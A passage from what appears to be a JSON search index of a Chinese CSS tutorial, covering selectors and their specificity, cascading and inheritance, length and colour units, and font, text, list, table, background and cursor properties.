选择器、通配选择器，理论上可以作为交集的条件，但实际应用中几乎不用 —— 因为没有意义\",\"交集选择器中不可能出现两个元素选择器，因为一个元素，不可能即是 p 元素又是 span 元 素\",\"用的最多的交集选择器是：元素选择器配合类名选择器，例如： p.beauty\"]},{\"header\":\"2. 并集选择器\",\"slug\":\"_2-并集选择器\",\"contents\":[\"作用：选中多个选择器对应的元素，又称：分组选择器\",\"语法：\",\"选择器1, 选择器2, 选择器3, ... 选择器n { 样式声明 } \",\"例：\",\"/* 选中id为peiqi，或类名为rich，或类名为beauty的元素 */ #peiqi, .rich, .beauty { font-size: 40px; background-color: skyblue; width: 200px; } \",\"注意：\",\"并集选择器，我们一般竖着写\",\"任何形式的选择器，都可以作为并集选择器的一部分\",\"并集选择器，通常用于集体声明，可以缩小样式表体积\"]},{\"header\":\"3. 基于HTML元素间的关系的选择器\",\"slug\":\"_3-基于html元素间的关系的选择器\",\"contents\":[\"分为：父元素、子元素、祖先元素、后代元素、兄弟元素\",\"父元素：直接包裹某个元素的元素，就是该元素的父元素\",\"CSS选择器01.png\",\"子元素：被父元素直接包含的元素（简记：儿子元素）\",\"CSS选择器02.png\",\"祖先元素：父亲的父亲......，一直往外找，都是祖先（父元素也算是祖先元素的一种）\",\"CSS选择器03.png\",\"后代元素：儿子的儿子......，一直往里找，都是后代（子元素，也算是后代元素的一种）\",\"CSS选择器04.png\",\"兄弟元素：具有相同父元素的元素，互为兄弟元素\",\"CSS选择器05.png\"]},{\"header\":\"1. 后代选择器\",\"slug\":\"_1-后代选择器\",\"contents\":[\"作用：选中指定元素中，符合要求的后代元素\",\"语法：\",\"选择器1 选择器2 选择器3 ...... 选择器n { 样式声明 } /*（先写祖先，再写后代）*/ \",\"语法说明：中间用空格隔开\",\"例：\",\"/* 选中ul中的所有li */ ul li { color: red; } /* 选中ul中所有li中的a */ ul li a { color: orange; } /* 选中类名为subject元素中的所有li */ .subject li { color: blue; } /* 选中类名为subject元素中的所有类名为front-end的li */ .subject li.front-end { color: blue; } \",\"注意：\",\"后代选择器，最终选择的是后代，不选中祖先\",\"儿子、孙子、重孙子，都算是后代\",\"结构一定要符合之前讲的 HTML 嵌套要求，例如：不能 p 中写 h1 ~ h6\"]},{\"header\":\"2. 子代选择器\",\"slug\":\"_2-子代选择器\",\"contents\":[\"作用：选中指定元素中，符合要求的子元素（儿子元素）。（先写父，再写子）\",\"语法：\",\"选择器1 > 选择器2 > 选择器3 > ...... 选择器n { 样式声明 } \",\"例：\",\"/* div中的子代a元素 */ div>a { color: red; } /* 类名为persons的元素中的子代a元素 */ .persons>a{ color: red; } \",\"注意：\",\"子代选择器，最终选择的是子代，不是父级\",\"子、孙子、重孙子、重重孙子 ...... 统称后代！，子就是指儿子\"]},{\"header\":\"3. 兄弟选择器\",\"slug\":\"_3-兄弟选择器\",\"contents\":[]},{\"header\":\"1. 相邻兄弟选择器\",\"slug\":\"_1-相邻兄弟选择器\",\"contents\":[\"作用：选中指定元素后，符合条件的相邻兄弟元素（所谓相邻，就是紧挨着他的下一个）\",\"语法：\",\"选择器1+选择器2 { 样式声明 } \",\"例：\",\"/* 选中div后相邻的兄弟p元素 */ div+p { color:red; } \"]},{\"header\":\"2. 通用兄弟选择器\",\"slug\":\"_2-通用兄弟选择器\",\"contents\":[\"作用：选中指定元素后，符合条件的所有兄弟元素\",\"语法：\",\"选择器1~选择器2 { 样式声明 } \",\"例：\",\"/* 选中div后的所有的兄弟p元素 */ div~p { color:red; } \"]},{\"header\":\"4. 属性选择器\",\"slug\":\"_4-属性选择器\",\"contents\":[\"作用：选中属性值符合一定要求的元素\",\"选择符\",\"简介\",\"E[att]\",\"选择具有 att 属性的 E 元素\",\"E[att=\\\"val\\\"]\",\"选择具有 att 属性且属性值等于 val 的 E 元素\",\"E[att^=\\\"val\\\"]\",\"匹配具有 att 属性且值以 val 开头的 E 元素\",\"E[att$=\\\"val\\\"]\",\"匹配具有 att 属性且值以 val 结尾的 E 元素\",\"E[att*=\\\"val\\\"]\",\"匹配具有 att 属性且值中含有 val 的 E 元素\",\"示例代码：\",\" /* 只选择 type=text 文本框的 input 选取出来 */ input[type=text] { color: pink; } /* 选择首先是 div 然后 具有 class 属性 并且属性值 必须是 icon 开头的这些元素 */ div[class^=icon] { color: red; } /* 选择首先是 section 然后 具有 class 属性 并且属性值 必须是 data 结尾的这些元素 */ section[class$=data] { color: blue; } \",\"属性选择器，按照字面意思，都是根据标签中的属性来选择元素，属性选择器可以根据元素特定属性的来选择元素。这样就可以不用借助于类或者 id 选择器，属性选择器也可以选择出来自定义的属性\"]},{\"header\":\"5. 伪类选择器\",\"slug\":\"_5-伪类选择器\",\"contents\":[\"作用：选中特殊状态的元素\"]},{\"header\":\"1. 动态伪类\",\"slug\":\"_1-动态伪类\",\"contents\":[\":link 超链接未被访问的状态\",\":visited 超链接访问过的状态\",\":hover 鼠标悬停在元素上的状态\",\":active 元素激活的状态\",\":focus 获取焦点的元素\",\"注意：\",\"激活表示按下鼠标不松开\",\"为了确保生效，请按照 LVHA 的顺序声明 :link － :visited － :hover － :active\",\"表单类元素才能使用 :focus 伪类，当用户点击元素、触摸元素、通过键盘的 tab 键等方法选择元素时，就是获得焦点\"]},{\"header\":\"2. 结构伪类\",\"slug\":\"_2-结构伪类\",\"contents\":[\"结构伪类选择器主要根据文档结构来选择元素，常用于根据父级选择器选择里面的子元素\",\"选择符\",\"简介\",\":first-child\",\"所有兄弟元素中的第一个\",\":last-child\",\"所有兄弟元素中的最后一个\",\":nth-child (n)\",\"所有兄弟元素中的第 n 个\",\":first-of-type\",\"所有同类型兄弟元素中的第一个\",\":last-of-type\",\"所有同类型兄弟元素中的最后一个\",\":nth-of-type (n)\",\"所有同类型兄弟元素中的第n个\",\"关于 n 的值：\",\"0 或不写 ：什么都选不中 —— 几乎不用\",\"n ：选中所有子元素 —— 几乎不用\",\"1~正无穷的整数 ：选中对应序号的子元素\",\"2n 或 even ：选中序号为偶数的子元素\",\"2n+1 或 odd ：选中序号为奇数的子元素\",\"-n+3 ：选中的是前 3 个\",\"n 可以是公式\",\"了解即可：\",\":nth-last-child(n) 所有兄弟元素中的倒数第 n 个\",\":nth-last-of-type(n) 所有同类型兄弟元素中的倒数第 n 个\",\":only-child 选择没有兄弟的元素（独生子女）\",\":only-of-type 选择没有同类型兄弟的元素\",\":root 根元素\",\":empty 内容为空元素（空格也算内容）\"]},{\"header\":\"3. 否定伪类\",\"slug\":\"_3-否定伪类\",\"contents\":[\":not(选择器) 排除满足括号中条件的元素\"]},{\"header\":\"4. UI伪类\",\"slug\":\"_4-ui伪类\",\"contents\":[\":checked 被选中的复选框或单选按钮\",\":enable 可用的表单元素（没有 disabled 属性）\",\":disabled 不可用的表单元素（有 disabled 属性）\"]},{\"header\":\"5. 目标伪类\",\"slug\":\"_5-目标伪类\",\"contents\":[\":target 选中锚点指向的元素\"]},{\"header\":\"6. 语言伪类\",\"slug\":\"_6-语言伪类\",\"contents\":[\":lang() 根据指定的语言选择元素（本质是看 lang 属性的值）\"]},{\"header\":\"6. 伪元素选择器\",\"slug\":\"_6-伪元素选择器\",\"contents\":[\"作用：选中元素中的有一些特殊位置\",\"::first-letter 选中元素中的第一个文字\",\"::first-line 选中元素中的第一行文字\",\"::selection 选中被鼠标选中的内容\",\"::placeholder 选中输入框的提示文字\",\"::before 在元素最开始的位置，创建一个子元素（必须用 content 属性指定内容）\",\"::after 在元素最后的位置，创建一个子元素（必须用 content 属性指定内容）\",\"注意：\",\"before 和 after 创建一个元素，但是属于行内元素\",\"新创建的这个元素在文档树中是找不到的，所以我们称为伪元素\",\"语法：element::before {}\",\"before 和 after 必须有 content 属性\",\"before 在父元素内容的前面创建元素，after 在父元素内容的后面插入元素\"]},{\"header\":\"3. 选择器的优先级\",\"slug\":\"_3-选择器的优先级\",\"contents\":[\"通过不同的选择器，选中相同的元素，并且为相同的样式名设置不同的值时，就发生了样式的冲突。到底应用哪个样式，此时就需要看优先级了\"]},{\"header\":\"1. 简单描述\",\"slug\":\"_1-简单描述\",\"contents\":[\"!important > 行内样式 > ID 选择器 > 类选择器 > 元素选择器 > 通配选择器\"]},{\"header\":\"2. 详细描述\",\"slug\":\"_2-详细描述\",\"contents\":[\"计算方式：每个选择器，都可计算出一组权重，格式为： (a,b,c)\",\"a : ID 选择器的个数\",\"b : 类、伪类、属性选择器的个数\",\"c : 元素、伪元素选择器的个数\",\"例：\",\"选择器\",\"权重\",\"ul>li\",\"(0,0,2)\",\"div ul>li p a span\",\"(0,0,6)\",\"#a .slogan\",\"(1,1,0)\",\"#a .slogan a\",\"(1,1,1)\",\"#a .slogan a:hover\",\"(1,2,1)\",\"比较规则：按照从左到右的顺序，依次比较大小，当前位胜出后，后面的不再对比\",\"例：\",\"(1,0,0) > (0,2,2)\",\"(1,1,0) > (1,0,3)\",\"(1,1,3) > (1,1,2)\",\"特殊规则：\",\"行内样式权重大于所有选择器\",\"!important 的权重，大于行内样式，大于所有选择器，权重最高！\",\"图示：\",\"CSS选择器06.png\"]}]},\"/front-end/css-notes/03-CSS%E4%B8%89%E5%A4%A7%E7%89%B9%E6%80%A7.html\":{\"title\":\"CSS三大特性\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"CSS 有三个非常重要的三个特性：层叠性、继承性、优先级\"]},{\"header\":\"1. 层叠性\",\"slug\":\"_1-层叠性\",\"contents\":[\"相同选择器给设置相同的样式，此时一个样式就会覆盖（层叠）另一个冲突的样式，层叠性主要解决样式冲突的问题\",\"层叠性原则:\",\"样式冲突，遵循的原则是就近原则，哪个样式离结构近，就执行哪个样式，即后面的样式会覆盖掉前面的样式\",\"样式不冲突，不会层叠\"]},{\"header\":\"2. 继承性\",\"slug\":\"_2-继承性\",\"contents\":[\"CSS 中的继承: 子标签会继承父标签的某些样式\",\"规则：优先继承离得近的\",\"恰当地使用继承可以简化代码，降低 CSS 样式的复杂性\",\"常见的可继承属性：text-??，font-??，line-??，color\"]},{\"header\":\"3. 优先级\",\"slug\":\"_3-优先级\",\"contents\":[\"!important > 行内样式 > ID 选择器 > 类选择器 > 元素选择器 > * > 继承的样式\"]}]},\"/front-end/css-notes/04-CSS%E9%95%BF%E5%BA%A6%E5%92%8C%E9%A2%9C%E8%89%B2.html\":{\"title\":\"CSS长度和颜色\",\"contents\":[{\"header\":\"1. 长度\",\"slug\":\"_1-长度\",\"contents\":[]},{\"header\":\"1.1 像素\",\"slug\":\"_1-1-像素\",\"contents\":[\"像素（px）是指由图像的小方格组成的，这些小格都有一个明确的位置和被分配的色彩数值，小方格颜色和位置就决定该图像所呈现出来的样子\",\"可以将像素视为整个图像中不可分割的单位或者是元素。不可分割的意思是它不能够再切割成更小单位抑或是元素，它是以一个单一颜色的小格存在。每一个点阵图像包含了一定量的像素，这些像素决定图像在屏幕上所呈现的大小，也就是说，显示器屏幕实际上是由一个一个的小点（单位色块，即像素）构成的\"]},{\"header\":\"1.2 屏幕分辨率\",\"slug\":\"_1-2-屏幕分辨率\",\"contents\":[\"例如，屏幕分辨率是1920×1080，则该屏幕水平方向有1920个像素，垂直方向有1080个像素\",\"不同屏幕的像素大小是不同的，也就是说像素大小不像我们现行的长度单位（如米/m）那样有着固定的国际标准\",\"所以同样的像素大小在不同的设备上显示效果是不一样的，像素越小的屏幕显示的效果越清晰\"]},{\"header\":\"1.3 图像分辨率\",\"slug\":\"_1-3-图像分辨率\",\"contents\":[\"例如，一张图片分辨率是300x200，则该图片在屏幕上按1:1缩放时，水平方向有300个像素，垂直方向有200个像素点\",\"图片分辨率越高，1:1缩放时面积越大\",\"图片分辨率越低，1:1缩放时面积越小\",\"同一台设备像素大小是不变的，那把图片放大超过100%时占的像素点就多了，但是图像也会变得模糊\"]},{\"header\":\"1.4 百分比\",\"slug\":\"_1-4-百分比\",\"contents\":[\"将属性值设置为相对于其父元素属性的百分比，可以使子元素跟随父元素的改变而改变\"]},{\"header\":\"1.5 em\",\"slug\":\"_1-5-em\",\"contents\":[\"em是相对于元素的字体大小来计算的，1em = <self>.font-size，也就说em值会根据元素本身的字体大小的改变而改变\"]},{\"header\":\"1.6 rem\",\"slug\":\"_1-6-rem\",\"contents\":[\"rem是相对于根元素的字体大小来计算，1em = <root>.font-size，也就说em值会根据根元素的字体大小的改变而改变\"]},{\"header\":\"2. 颜色\",\"slug\":\"_2-颜色\",\"contents\":[]},{\"header\":\"2.1 颜色名\",\"slug\":\"_2-1-颜色名\",\"contents\":[\"编写方式：直接使用颜色对应的英文单词，编写比较简单\",\"如：\",\"红色：red\",\"绿色：green\",\"蓝色：blue\",\"紫色：purple\",\"橙色：orange\",\"灰色：gray\"]},{\"header\":\"2.2 rgb或rgba\",\"slug\":\"_2-2-rgb或rgba\",\"contents\":[\"编写方式：使用红、黄、蓝这三种光的三原色进行组合\",\"r 表示红色， g 表示绿色， b 表示蓝色， a 表示透明度\",\"例：\",\"/* 使用 0~255 之间的数字表示一种颜色 */ color: rgb(255, 0, 0);/* 红色 */ color: rgb(0, 255, 0);/* 绿色 */ color: rgb(0, 0, 255);/* 蓝色 */ color: rgb(0, 0, 0);/* 黑色 */ color: rgb(255, 255, 255);/* 白色 */ /* 混合出任意一种颜色 */ color:rgb(138, 43, 226) /* 紫罗兰色 */ color:rgba(255, 0, 0, 0.5);/* 半透明的红色 */ /* 也可以使用百分比表示一种颜色（用的少） */ color: rgb(100%, 0%, 0%);/* 红色 */ color: rgba(100%, 0%, 0%,50%);/* 半透明的红色 */ \",\"小规律：\",\"若三种颜色值相同，呈现的是灰色，值越大，灰色越浅\",\"rgb (0, 0, 0) 是黑色， rgb (255, 255,255) 是白色\",\"对于 rbga 来说，前三位的 rgb 形式要保持一致，要么都是 0~255 的数字，要么都是百分比\"]},{\"header\":\"2.3 HEX或HEXA\",\"slug\":\"_2-3-hex或hexa\",\"contents\":[\"HEX 的原理同与 rgb 一样，依然是通过：红、绿、蓝色进行组合，只不过要用 6位（分成3组） 来表达，格式为：#rrggbb\",\"每一位数字的取值范围是： 0 ~ f ，即：（ 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, a, b, c, d, e, f ），所以每一种光的最小值是： 00 ，最大值是： ff\",\"color: #ff0000;/* 红色 */ color: #00ff00;/* 绿色 */ color: #0000ff;/* 蓝色 */ color: #000000;/* 黑色 */ color: #ffffff;/* 白色 */ /* 如果每种颜色的两位都是相同的，就可以简写*/ color: #ff9988;/* 可简为：#f98 */ /* 但要注意前三位简写了，那么透明度就也要简写 */ color: #ff998866;/* 可简为：#f986 */ \"]},{\"header\":\"2.4 HSL或HSLA\",\"slug\":\"_2-4-hsl或hsla\",\"contents\":[\"HSL 是通过：色相、饱和度、亮度，来表示一个颜色的，格式为：hsl(色相,饱和度,亮度)\",\"色相：取值范围是 0~360 度，具体度数对应的颜色如下图\",\"CSS长度和颜色01.png\",\"饱和度：取值范围是 0%~100% 。（向色相中对应颜色中添加灰色， 0% 全灰， 100% 没有灰）\",\"亮度：取值范围是 0%~100% 。（ 0% 亮度没了，所以就是黑色。 100% 亮度太强，所以就是白色了）\",\"HSLA 其实就是在 HSL 的基础上，添加了透明度\"]}]},\"/front-end/css-notes/05-CSS%E5%B8%B8%E7%94%A8%E5%B1%9E%E6%80%A7.html\":{\"title\":\"CSS常用属性\",\"contents\":[{\"header\":\"1. CSS字体属性\",\"slug\":\"_1-css字体属性\",\"contents\":[]},{\"header\":\"1.1 字体大小\",\"slug\":\"_1-1-字体大小\",\"contents\":[\"属性名：font-size\",\"作用：控制字体的大小\",\"语法：\",\"p { font-size: 20px; } \",\"谷歌浏览器支持的最小文字为 12px，默认的文字大小为 16px，并且 0px 会自动消失\",\"不同浏览器可能默认显示的字号大小不一致，我们尽量给一个明确值大小，不要默认大小\",\"可以给 body 指定整个页面文字的大小\",\"由于字体设计原因，文字最终呈现的大小，并不一定与 font-size 的值一致，可能大，也可能小\",\"通常情况下，文字相对字体设计框，并不是垂直居中的，通常都靠下一些\"]},{\"header\":\"1.2 字体族\",\"slug\":\"_1-2-字体族\",\"contents\":[\"属性名：font-family\",\"作用：控制字体类型\",\"语法：\",\"p{ font-family：\\\"微软雅黑\\\"； } \",\"各种字体之间必须使用英文状态下的逗号隔开\",\"一般情况下，如果有空格隔开的多个单词组成的字体，加引号\",\"尽量使用系统默认自带字体，保证在任何用户的浏览器中都能正确显示\",\"使用字体的英文名字兼容性会更好\",\"可以设置多个字体，按照从左到右的顺序逐个查找，找到就用，没有找到就使用后面的，且通常在最后写上 serif （衬线字体）或 sans-serif （非衬线字体）\"]},{\"header\":\"1.3 字体风格\",\"slug\":\"_1-3-字体风格\",\"contents\":[\"属性名：font-style\",\"作用：控制字体是否为斜体\",\"语法：\",\"p { font-style: normal; } \",\"属性值\",\"作用\",\"normal\",\"默认值，浏览器会显示标准的字体样式\",\"italic\",\"浏览器会显示斜体的字体样式（推荐使用）\",\"oblique\",\"斜体（强制倾斜产生的斜体效果）\"]},{\"header\":\"1.4 字体粗细\",\"slug\":\"_1-4-字体粗细\",\"contents\":[\"属性名：font-weight\",\"作用：控制字体的粗细\",\"语法：\",\"p { font-weight: bold; } p { font-weight: 600; } \",\"属性值\",\"描述\",\"normal\",\"默认值（不加粗的）\",\"bold\",\"定义粗体（加粗的）\",\"lighter\",\"细\",\"bolder\",\"很粗\",\"100~1000\",\"100~300 等同于 lighter，400~500 等同于 normal，而 600 及以上 等同于 bold，注意这个数字后面不跟单位\"]},{\"header\":\"1.5 字体的复合写法\",\"slug\":\"_1-5-字体的复合写法\",\"contents\":[\"属性名：font，可以把上述字体样式合并成一个属性\",\"作用：将上述所有字体相关的属性复合在一起编写\",\"编写规则：\",\"字体大小、字体族必须都写上\",\"字体族必须是最后一位、字体大小必须是倒数第二位\",\"各个属性间用空格隔开\",\"body { font: font-style font-weight font-size/line-height font-family; } \"]},{\"header\":\"2. CSS文本属性\",\"slug\":\"_2-css文本属性\",\"contents\":[]},{\"header\":\"2.1 文本颜色\",\"slug\":\"_2-1-文本颜色\",\"contents\":[\"属性名：color\",\"作用：控制文字的颜色\",\"可选值：\",\"颜色名\",\"rgb 或 rgba\",\"HEX 或 HEXA （十六进制）（开发中最常用）\",\"HSL 或 HSLA\",\"语法：\",\"div { color: red; } \"]},{\"header\":\"2.2 文本间距\",\"slug\":\"_2-2-文本间距\",\"contents\":[\"字母间距： letter-spacing\",\"单词间距： word-spacing （通过空格识别词）\",\"属性值为像素（ px ），正值让间距增大，负值让间距缩小\"]},{\"header\":\"2.3 文本修饰\",\"slug\":\"_2-3-文本修饰\",\"contents\":[\"属性名：text-decoration\",\"作用：控制文本的各种装饰线\",\"语法：\",\"div { text-decoration：underline; } \",\"属性值\",\"描述\",\"none\",\"默认，没有装饰线\",\"underline\",\"下划线，链接自带下划线\",\"overline\",\"上划线\",\"line-through\",\"删除线\",\"可搭配如下值使用：\",\"dotted ：虚线\",\"wavy ：波浪线\",\"也可以指定颜色\"]},{\"header\":\"2.4 文本缩进\",\"slug\":\"_2-4-文本缩进\",\"contents\":[\"属性名： text-indent\",\"作用：控制文本首字母的缩进\",\"语法：\",\"div { text-indent：20px； } div { text-indent：2em； } \",\"em 是一个相对单位，就是当前元素（font-size) 1 个文字的大小, 如果当前元素没有设置大小，则会按照父元素的 1 个文字大小\"]},{\"header\":\"2.5 文本对齐_水平\",\"slug\":\"_2-5-文本对齐-水平\",\"contents\":[\"属性名：text-align\",\"作用：控制文本的水平对齐方式\",\"语法：\",\"div { text-align: center; } \",\"属性值\",\"解释\",\"left\",\"左对齐（默认值）\",\"right\",\"右对齐\",\"center\",\"居中对齐\"]},{\"header\":\"2.6 行高\",\"slug\":\"_2-6-行高\",\"contents\":[\"属性名：line-height\",\"作用：控制一行文字的高度\",\"可选值：\",\"normal ：由浏览器根据文字大小决定的一个默认值\",\"像素 ( px )\",\"数字：参考自身 font-size 的倍数（很常用）\",\"百分比：参考自身 font-size 的百分比\",\"语法：\",\"p { line-height: 26px; line-height: 1.5; line-height: 150%; } \",\"行高注意事项：\",\"line-height 过小会怎样？—— 文字产生重叠，且最小值是 0 ，不能为负数\",\"line-height 是可以继承的，且为了能更好的呈现文字，最好写数值\",\"line-height 和 height 是什么关系？ \",\"设置了 height ，那么高度就是 height 的值\",\"不设置 height 的时候，会根据 line-height 计算高度\",\"应用场景：\",\"对于多行文字：控制行与行之间的距离\",\"对于单行文字：让 height 等于 line-height ，可以实现文字垂直居中（由于字体设计原因，靠上述办法实现的居中，并不是绝对的垂直居中，但如果一行中都是文字，不会太影响观感）\"]},{\"header\":\"2.7 文本对齐_垂直\",\"slug\":\"_2-7-文本对齐-垂直\",\"contents\":[\"顶部：无需任何属性，在垂直方向上，默认就是顶部对齐\",\"居中：对于单行文字，让 height = line-height 即可\",\"底部：对于单行文字，目前一个临时的方式： 让 line-height = ( height × 2 ) - font-size - x ，备注： x 是根据字体族，动态决定的一个值\"]},{\"header\":\"2.8 vertical-align\",\"slug\":\"_2-8-vertical-align\",\"contents\":[\"属性名： vertical-align\",\"作用：用于指定同一行元素之间，或表格单元格内文字的垂直对齐方式\",\"常用值：\",\"baseline （默认值）：使元素的基线与父元素的基线对齐\",\"top ：使元素的顶部与其所在行的顶部对齐\",\"middle ：使元素的中部与父元素的基线加上父元素字母 x 的一半对齐\",\"bottom ：使元素的底部与其所在行的底部对齐\",\"特别注意： vertical-align 不能控制块元素\"]},{\"header\":\"3. CSS列表属性\",\"slug\":\"_3-css列表属性\",\"contents\":[\"列表相关的属性，可以作用在 ul 、 ol 、 li 元素上\"]},{\"header\":\"3.1 list-style-type\",\"slug\":\"_3-1-list-style-type\",\"contents\":[\"功能：设置列表符号\",\"属性值：\",\"none：不显示前面的标识\",\"square：实心方块\",\"disc：圆形\",\"decimal：数字\",\"lower-roman：小写罗马字\",\"upper-roman：大写罗马字\",\"lower-alpha：小写字母\",\"upper-alpha：大写字母\"]},{\"header\":\"3.2 list-style-position\",\"slug\":\"_3-2-list-style-position\",\"contents\":[\"功能：设置列表符号的位置\",\"属性值：\",\"inside ：在 li 的里面\",\"outside ：在 li 的外边\"]},{\"header\":\"3.3 list-style-image\",\"slug\":\"_3-3-list-style-image\",\"contents\":[\"功能：自定义列表符号\",\"属性值：url(图片地址)\"]},{\"header\":\"3.4 list-style\",\"slug\":\"_3-4-list-style\",\"contents\":[\"功能：复合属性\",\"属性值：没有数量、顺序的要求\"]},{\"header\":\"4. CSS表格属性\",\"slug\":\"_4-css表格属性\",\"contents\":[]},{\"header\":\"4.1 边框相关属性\",\"slug\":\"_4-1-边框相关属性\",\"contents\":[\"CSS 属性名\",\"功能\",\"属性值\",\"border-width\",\"边框宽度\",\"CSS 中可用的长度值\",\"border-color\",\"边框颜色\",\"CSS 中可用的颜色值\",\"border-style\",\"边框风格\",\"none 默认值solid 实线dashed 虚线dotted 点线double 双实线\",\"border\",\"边框复合属性\",\"没有数量、顺序的要求\",\"注意：以上 4 个边框相关的属性，其他元素也可以用\"]},{\"header\":\"4.2 表格独有属性\",\"slug\":\"_4-2-表格独有属性\",\"contents\":[\"CSS 属性名\",\"功能\",\"属性值\",\"table-layout\",\"设置列宽度\",\"auto 自动，列宽度根据内容计算（默认值）fixed 固定列宽，平均分\",\"border-spacing\",\"单元格间距\",\"CSS 中可用的长度值 （生效的前提是单元格边框不能合并）\",\"border-collapse\",\"合并单元格边框\",\"collapse 合并separate 不合并\",\"empty-cells\",\"隐藏没有内容的单元格\",\"show 显示，默认值hide 隐藏 （生效的前提是单元格不能合并）\",\"caption-side\",\"设置表格标题位置\",\"top 上面，默认值bottom 在表格下面\",\"注意：以上 5 个属性，只有表格才能使用，即 <table> 标签\"]},{\"header\":\"5. CSS的背景\",\"slug\":\"_5-css的背景\",\"contents\":[\"通过 CSS 背景属性，可以给页面元素添加背景样式\",\"背景属性可以设置背景颜色、背景图片、背景平铺、背景图片位置、背景图像固定等\"]},{\"header\":\"5.1 背景颜色\",\"slug\":\"_5-1-背景颜色\",\"contents\":[\"样式名称：background-color 定义元素的背景颜色\",\"使用方式：\",\"background-color：颜色值； \",\"其他说明：元素背景颜色默认值是 transparent（透明）\",\"background-color:transparent； \"]},{\"header\":\"5.2 背景图片\",\"slug\":\"_5-2-背景图片\",\"contents\":[\"样式名称：background-image 定义元素的背景图片\",\"使用方式：\",\"background-image:none | url(url); \",\"参数值\",\"作用\",\"none\",\"无背景图（默认的）\",\"url\",\"使用绝对或相对地址指定背景图像\",\"其他说明：实际开发常见于 logo 或者一些装饰性的小图片或者是超大的背景图片, 优点是非常便于控制位置 (精灵图也是一种运用场景)\",\"注意：背景图片后面的地址，千万不要忘记加 url，同时里面的路径不要加引号\"]},{\"header\":\"5.3 背景平铺\",\"slug\":\"_5-3-背景平铺\",\"contents\":[\"样式名称：background-repeat 设置元素背景图像的平铺\",\"使用方式：\",\"background-repeat:repeat | no-repeat | repeat-x | repeat-y; \",\"参数值\",\"作用\",\"repeat\",\"背景图像在纵向和横向上平铺（默认的）\",\"no-repeat\",\"背景图像不平铺\",\"repeat-x\",\"背景图像在横向上平铺\",\"repeat-y\",\"背景图像在纵向上平铺\",\"注意：背景图片会压住背景颜色\"]},{\"header\":\"5.4 背景图片位置\",\"slug\":\"_5-4-背景图片位置\",\"contents\":[\"样式名称：background-position 属性可以改变图片在背景中的位置\",\"使用方式：\",\"background-position:x y; \",\"参数含义：x 坐标和 y 坐标。可以使用方位名词或者精确单位\",\"参数值\",\"说明\",\"length\",\"百分数、由浮点数或单位标识符组成的长度值\",\"position\",\"top、center、bottom、left、center、right 等方位名词\",\"其他说明：\",\"参数是方位名词, 如果指定的两个值都是方位名词，则两个值前后顺序无关，比如 left top 和 top left 效果一致, 如果只指定了一个方位名词，另一个值省略，则第二个值默认居中对齐\",\"参数是精确单位, 如果参数值是精确坐标，那么第一个肯定是 x 坐标，第二个一定是 y 坐标, 如果只指定一个数值，那该数值一定是 x 坐标，另一个默认垂直居中\",\"参数是混合单位, 如果指定的两个值是精确单位和方位名词混合使用，则第一个值是 x 坐标，第二个值是 y 坐标\"]},{\"header\":\"5.5 背景图片固定\",\"slug\":\"_5-5-背景图片固定\",\"contents\":[\"样式名称：background-attachment 属性设置背景图像是否固定或者随着页面的其余部分滚动\",\"使用方式：\",\"background-attachment:scroll | fixed; \",\"参数\",\"作用\",\"scroll\",\"背景图像是随对象内容滚动\",\"fixed\",\"背景图像固定\",\"其他说明：background-attachment 可以制作视差滚动的效果\"]},{\"header\":\"5.6 背景样式复合写法\",\"slug\":\"_5-6-背景样式复合写法\",\"contents\":[\"背景合写样式：background: 背景颜色、背景图片地址、背景平铺、背景图像滚动、背景图片位置;\",\"使用方式：\",\"background: 背景颜色 背景图片地址 背景平铺 背景图像滚动 背景图片位置； \"]},{\"header\":\"5.7 背景色半透明\",\"slug\":\"_5-7-背景色半透明\",\"contents\":[\"CSS3 提供了背景颜色半透明的效果\",\"使用方式：\",\"background：rgba(0,0,0,0.3); \",\"最后一个参数是 alpha 透明度，取值范围在 0~1 之间\",\"我们习惯把 0.3 的 0 省略掉，写为 background:rgba(0,0,0,.3);\",\"注意：\",\"背景半透明是指盒子背景半透明，盒子里面的内容不受影响\"]},{\"header\":\"5.8 背景总结\",\"slug\":\"_5-8-背景总结\",\"contents\":[\"属性\",\"作用\",\"值\",\"background-color\",\"背景颜色\",\"预定义的颜色值/十六进制/RGB 代码\",\"background-image\",\"背景图片\",\"url (图片路径)\",\"background-repeat\",\"是否平铺\",\"repeat/no-repeat/repeat-x/repeat-y\",\"background-position\",\"背景位置\",\"length/position 分别是 x 和 y 坐标\",\"background-attachment\",\"背景附着\",\"scroll（背景滚动）/fixed（背景固定）\",\"背景简写\",\"书写更简单\",\"背景颜色、背景图片地址、背景平铺、背景图像滚动、背景图片位置\",\"背景色半透明\",\"背景颜色半透明\",\"background: rgba ()\"]},{\"header\":\"6. CSS鼠标属性\",\"slug\":\"_6-css鼠标属性\",\"contents\":[\"CSS 属性名\",\"功能\",\"属性值\",\"cursor\",\"设置鼠标光标的样式\",\"pointer 小手move 移动图标 text 文字选择器 crosshair 十字架wait 等待help 帮助\",\"扩展：自定义鼠标图标\",\"/* 自定义鼠标光标 */ cursor: url(\\\"./arrow.png\\\"),pointer; \"]}]},\"/front-end/css-notes/06-CSS%E5%85%83%E7%B4%A0%E6%98%BE%E7%A4%BA%E6%A8%A1%E5%BC%8F.html\":{\"title\":\"CSS元素显示模式\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"定义：元素显示模式就是元素（标签）以什么方式进行显示，比如 <div> 自己占一行，比如一行可以放多个 <span>\",\"作用：网页的标签非常多，在不同地方会用到不同类型的标签，了解他们的特点可以更好的布局我们的网页\"]},{\"header\":\"1. 元素显示模式的分类\",\"slug\":\"_1-元素显示模式的分类\",\"contents\":[]},{\"header\":\"1.1 块元素\",\"slug\":\"_1-1-块元素\",\"contents\":[\"<!-- 主体结构标签 --> <html>、<body> <!-- 排版标签 --> <h1>~<h6>、<hr>、<p>、<pre>、<div> <!-- 列表标签 --> <ul>、<ol>、<li>、<dl>、<dt>、<dd> <!-- 表格相关标签 --> <table>、<tbody>、<thead>、<tfoot>、<tr>、<caption> <!-- 表单相关标签 --> <form>与<option> \",\"块级元素的特点：\",\"在页面中独占一行，不会与任何元素共用一行，是从上到下排列的\",\"默认宽度：撑满父元素\",\"默认高度：由内容撑开\",\"可以通过 CSS 设置宽高\",\"注意：\",\"文字类的元素内不能放块级元素\",\"<p> 标签主要用于存放文字，因此 <p> 里面不能放块级元素，特别是不能放 <div>\",\"<h1>~<h6> 等都是文字类块级标签，里面也不能放其他块级元素\"]},{\"header\":\"1.2 